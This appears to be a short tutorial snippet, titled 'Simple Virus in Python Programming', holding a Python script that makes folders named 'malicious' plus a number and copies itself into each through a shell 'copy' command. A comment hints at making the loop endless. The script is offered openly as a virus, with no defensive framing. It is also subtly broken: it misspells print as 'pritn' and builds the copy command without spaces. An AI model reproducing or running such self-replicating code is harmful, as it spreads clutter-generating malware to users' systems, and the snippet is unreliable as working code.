#22 Simple Virus in Python Programming
from sys import argv
import os
folder_name = 'malicious'
count = 0
script = argv
main_file_name = str(script[0])
while count <10: #True
    count +=1
    try:
        temp = folder_name+str(count)
        os.mkdir(temp)
        os.system(r"copy"+main_file_name +"{0}".format(temp))
    except Exception as Error:
        pritn(Error)
        count +=10

